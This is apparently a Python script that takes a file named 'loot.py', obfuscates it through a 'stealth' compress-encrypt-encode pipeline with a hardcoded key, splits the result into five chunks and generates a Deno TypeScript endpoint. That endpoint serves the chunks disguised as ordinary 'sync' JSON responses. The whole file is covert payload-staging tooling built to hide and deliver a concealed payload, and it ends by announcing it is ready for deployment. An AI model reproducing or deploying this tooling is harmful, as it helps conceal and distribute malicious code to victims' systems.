
import os
import json
import uuid
import math
from obfuscator import Obfuscator

LOOT_PATH = "loot.py"
OUTPUT_PATH = "api/chunks.ts"
XOR_KEY = "ROLLING_DAILY_KEY_123" # Must match client config (in production, should be dynamic)

def split_payload(payload_str, num_chunks=5):
    """Splits string into n even chunks."""
    length = len(payload_str)
    chunk_size = math.ceil(length / num_chunks)
    return [payload_str[i:i + chunk_size] for i in range(0, length, chunk_size)]

def main():
    print(f"Reading loot from {LOOT_PATH}...")
    
    if not os.path.exists(LOOT_PATH):
        print(f"Error: {LOOT_PATH} not found.")
        return

    with open(LOOT_PATH, 'r', encoding='utf-8') as f:
        content = f.read()

    print(f"Payload found! Length: {len(content)}")
    
    print("Encrypting with Advanced Stealth Pipeline (Zlib -> RC4 -> Base85)...")
    try:
        # Convert string code to bytes for encryption
        payload_bytes = content.encode('utf-8')
        
        # Encrypt
        encrypted = Obfuscator.encrypt_payload(payload_bytes, XOR_KEY)
        print(f"Obfuscation complete. Encrypted Length: {len(encrypted)}")
        
        # Split
        print("Splitting into 5 chunks...")
        chunk_parts = split_payload(encrypted, 5)
        
        # Pad if less than 5 (should rarely happen for meaningful payloads)
        while len(chunk_parts) < 5:
            chunk_parts.append("")

        chunks_obj = {}
        for i, part in enumerate(chunk_parts):
            chunks_obj[str(i)] = {
                "data": part
            }

        # Generate TS content
        # Note: We generate valid TypeScript for Deno
        file_content = f"""
// Auto-generated by generate_chunks.py
// Encrypted Length: {len(encrypted)}

const CHUNK_STORE: Record<string, {{ data: string, junk_prefix?: string, junk_suffix?: string }}> = {json.dumps(chunks_obj, indent=2)};

export function handleChunks(req: Request): Response {{
    const url = new URL(req.url);
    const id = url.searchParams.get("id");

    if (!id || !CHUNK_STORE[id]) {{
        return new Response(JSON.stringify({{ error: "Chunk sync failed" }}), {{ 
            status: 400,
            headers: {{ "Content-Type": "application/json" }}
        }});
    }}

    const chunk = CHUNK_STORE[id];
    
    const responseBody = {{
        sync_id: crypto.randomUUID(),
        p: chunk.data, 
        meta: {{ valid: true }} 
    }};

    return new Response(JSON.stringify(responseBody), {{
        headers: {{ "Content-Type": "application/json" }}
    }});
}}
"""
        
        # Write to file
        os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
        with open(OUTPUT_PATH, 'w', encoding='utf-8') as f:
            f.write(file_content)
            
        print(f"Successfully wrote chunks to {OUTPUT_PATH}")
        print("Ready for deployment.")

    except Exception as e:
        print(f"Generation failed: {e}")

if __name__ == "__main__":
    main()
